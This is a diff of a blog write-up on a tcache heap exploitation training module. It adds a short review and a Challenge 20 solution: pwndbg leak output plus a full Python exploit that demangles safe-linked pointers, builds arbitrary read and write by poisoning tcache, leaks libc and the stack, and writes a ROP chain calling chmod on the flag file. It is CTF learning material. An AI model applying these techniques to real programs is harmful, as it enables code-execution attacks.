@@ -13,6 +13,10 @@ categories: jekyll update
 Over the years, there were many heap exploitation techniques developed. Most of them can be found [here][heap-techniques] (there are other obscure techniques, not mentioned there). \
 This module deals with a subset of techniques, only involving the tcache. 
 
+I really liked this module. I've gained deeper understanding regarding tcache internals, and learned many new useful tricks. \
+Challenges 15+ weren't trivial, and they've required some time. The demonstrated scenarios were much more realistic than previous modules - full mitigations, no leaks, very limited primitives, etc. The fact that these latter challenges all uses safe-linking, is a huge bonus. \
+I highly recommend this module for anyone interested in modern (`glibc-2.40`) heap exploitation. 
+
 ## Background
 
 One approach of dynamically allocating memory is `mmap`. While it does allows dynamic allocation and deallocation for regions that surivves across functions (unlike the stack), the allocation size is inflexible, and requires kernel involvment for every call. \
@@ -1280,7 +1284,187 @@ def main():
 
 ## Challenge 20
 
+Same as before, but we no longer have any flag being loaded to `malloc` chunk. Moreover, there's no `win` function or anything, hence at the end, we'd have to execute ROP chain. \
+My idea is to utilize the fact that we have a file stream being allocated on the heap. 
 
+While we can easly get arbitrary R / W primitives (and heap leak) in the same manner as challenge 19, we still miss stack and PIE program leaks. Using the allocated file stream, we can easly get a libc address, and from there - read `environ` and having a stack leak. \
+A possible approach the author was intended, is to use file stream exploit, aka - overwrite the `_IO_base_ptr` or `_IO_write_ptr`, to achieve R / W primitive (which we already have) or alternatively, the `vtable` and `wide_data`, to achieve control flow primitive. But as stated, all of these aren't really needed in that case - we can do so solely based on the leaks that resides within the heap, overwriting the stack and performing a ROP chain.  
+
+Indeed, we can see the file stream has been allocated on the heap, and left a `libc` leak there, as we can see in offset `0x4d8`:
+
+```bash
+pwndbg> probeleak 0x5588c814d000 0x5000
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+0x00c8: 0x00005588c814d350 = (rw-p) [heap] + 0x350
+0x0478: 0x00005588c814d650 = (rw-p) [heap] + 0x650
+0x0480: 0x00005588c814d650 = (rw-p) [heap] + 0x650
+0x0488: 0x00005588c814d650 = (rw-p) [heap] + 0x650
+0x0490: 0x00005588c814d650 = (rw-p) [heap] + 0x650
+0x0498: 0x00005588c814d650 = (rw-p) [heap] + 0x650
+0x04a0: 0x00005588c814d650 = (rw-p) [heap] + 0x650
+0x04a8: 0x00005588c814d650 = (rw-p) [heap] + 0x650
+0x04b0: 0x00005588c814da50 = (rw-p) [heap] + 0xa50
+0x04d8: 0x00007fa4448516a0 = (rw-p) /challenge/lib/libc.so.6 + 0x16a0 (_IO_2_1_stderr_)
+0x04f8: 0x00005588c814d550 = (rw-p) [heap] + 0x550
+0x0510: 0x00005588c814d560 = (rw-p) [heap] + 0x560
+0x0548: 0x00007fa44484d600 = (r--p) /challenge/lib/libc.so.6 + 0x1600 (_IO_file_jumps)
+0x0640: 0x00007fa44484d0c0 = (r--p) /challenge/lib/libc.so.6 + 0x10c0 (_IO_wfile_jumps)
+```
+
+Hence, upon obtaining the stack leak, as well as forging the heap's R / W primitives, we can easily create a ROP chain. \
+I've implemented `arbitrary_read` and `arbitrary_write` methods, to make my solution as elegant as possible:
+
+```python
+def demangle_ptr(mangled_ptr):
+    ptr_size = len(mangled_ptr)
+    mangled_value = mangled_ptr + b'\x00' * (8 - ptr_size)
+    mangled_value = struct.unpack('<Q', mangled_value)[0]
+    print(f'mangled_value: {hex(mangled_value)}')
+    nibbles_str = hex(mangled_value)[2:-3]
+    print(f'nibbles_str: {nibbles_str}')
+    nibbles = textwrap.wrap(nibbles_str, 3)
+    print(f'nibbles: {nibbles}')
+    key = 0
+    for nibble in nibbles:
+        nibble_val = int(nibble, 16)
+        new_key = nibble_val ^ (key & 0xfff)
+        key = key << 12
+        key += new_key
+    
+    ptr = mangled_value ^ key
+
+    assert(len(hex(key)) == len(hex(ptr)) - 3)
+    assert(key == (ptr >> 12))  # Same page assumption
+    assert((ptr & 0xf) == 0)  # All heap pointers shall be aligned
+
+    return ptr, key
+
+def safe_write(p, index):
+    p.sendline(b'safe_write')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.readline()
+    p.readline()
+    buf = p.readline()[:-1]
+    p.recvuntil(b'quit): ')
+
+    return buf
+
+def safe_read(p, index, buf):
+    p.sendline(b'safe_read')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.readline()
+    p.send(buf)
+    p.recvuntil(b'quit): ')
+
+    return 
+
+def allocate_chunk_at_addr_in_slot(p, addr, slot, size, key):
+    assert((addr & 0xf) == 0)
+    assert((size % 0x10) == 8)
+
+    malloc(p, 0, size)
+    malloc(p, 1, size)
+    malloc(p, 2, size)
+    free(p, 2)
+    free(p, 1)
+    buf_2 = b'A' * size
+    buf_2 += struct.pack('<Q', size + 8 + 1)  # Keep the original chunk siz
+    buf_2 += struct.pack('<Q', addr ^ key)  # Overwrite next to our goal chunk
+    safe_read(p, 0, buf_2)
+    malloc(p, 0, size)
+    malloc(p, slot, size)
+
+def arbitrary_read(p, heap_key, addr):
+    '''
+    Internally, corrupts slots 0, 1, 2. 
+    Has a side effect of nullifying some bytes near the leak, as a malloc chunk is being allocated and chunk->key = NULL. 
+    Therefore, choose addr wisely
+    '''
+    lsb_nibble = addr & 0xf
+    assert(lsb_nibble == 0 or lsb_nibble == 8)
+    if lsb_nibble == 8:
+        paddings_size = 0x18
+    elif lsb_nibble == 0:
+        paddings_size = 0x0
+
+    chunk_size = 0x88
+    allocate_chunk_at_addr_in_slot(p, addr - paddings_size, 0, chunk_size, heap_key)
+    buf_2 = safe_write(p, 0)
+    assert(len(buf_2) == chunk_size + 16)
+    result = struct.unpack('<Q', buf_2[paddings_size: paddings_size + 8])[0]
+    
+    return result
+
+def arbitrary_write(p, heap_key, addr, values):
+    '''
+    Internally, corrupts slots 0, 1, 2. 
+    Has a side effect of nullifying some bytes near the allocation, as a malloc chunk is being allocated and chunk->key = NULL. 
+    Therefore, choose addr wisely
+    '''
+    lsb_nibble = addr & 0xf
+    assert(lsb_nibble == 0 or lsb_nibble == 8)
+    if lsb_nibble == 8:
+        paddings_size = 0x8     
+    elif lsb_nibble == 0:
+        paddings_size = 0x0
+
+    values = b'A' * paddings_size + values  # Since the allocation may be 8 bytes before the goal address, we have to supply extra padding
+    chunk_size = len(values) + (0x10 - (len(values) % 0x10)) + 8  # Make sure the allocated chunk is large enough, and contains nibble of 0x8
+    allocate_chunk_at_addr_in_slot(p, addr - paddings_size, 0, chunk_size, heap_key)
+    safe_read(p, 0, values)
+    
+    return
+
+def exploit():
+    p = process(BINARY)
+    p.recvuntil(b'quit): ')
+    
+    # Phase 1 - leak a mangled heap pointer
+    chunk_size = 0x88
+    malloc(p, 0, chunk_size)
+    malloc(p, 1, chunk_size)
+    malloc(p, 2, chunk_size)
+    free(p, 2)
+    free(p, 1)
+    buf = safe_write(p, 0)
+    assert(len(buf) == chunk_size + 16)
+    heap_next, heap_key = demangle_ptr(buf[-8:])
+    heap_base = heap_next & 0xfffffffffffff000
+    print(f'heap_base: {hex(heap_base)} heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
+    IO_stderr_heap_addr = heap_base + 0x4d8
+    print(f'IO_stderr_heap_addr: {hex(IO_stderr_heap_addr)}')
+
+    # Phase 2 - leak libc address using the allocated stream
+    IO_stderr_libc_addr = arbitrary_read(p, heap_key, addr=IO_stderr_heap_addr)
+    libc_base = IO_stderr_libc_addr - libc.symbols['_IO_2_1_stderr_']
+    environ_libc = libc_base + libc.symbols['environ']
+    chmod_addr = libc_base + libc.symbols['chmod']
+    pop_rdi_ret = libc_base + libc_rop.rdi.address
+    pop_rsi_ret = libc_base + libc_rop.rsi.address
+    assert(libc_base & 0xfff == 0)
+    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')
+    
+    # Phase 3 - leak stack address
+    environ_stack_addr = arbitrary_read(p, heap_key, addr=environ_libc)
+    main_ra = environ_stack_addr - 288
+    print(f'environ_stack_addr: {hex(environ_stack_addr)} main_ra: {hex(main_ra)}')
+
+    # Phase 4 - overwrite the stack, to create a ROP chain
+    flag_string_addr = main_ra + 0x28
+    rop_buf = b''
+    rop_buf += struct.pack('<Q', pop_rdi_ret)
+    rop_buf += struct.pack('<Q', flag_string_addr)
+    rop_buf += struct.pack('<Q', pop_rsi_ret)
+    rop_buf += struct.pack('<Q', 0xffff)
+    rop_buf += struct.pack('<Q', chmod_addr)
+    rop_buf += struct.pack('<Q', 0x67616c662f)  # flag_string_addr
+    arbitrary_write(p, heap_key, addr=main_ra, values=rop_buf)
+
+    p.sendline(b'quit')
+    p.interactive()
+```
 
 
 [heap-techniques]: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
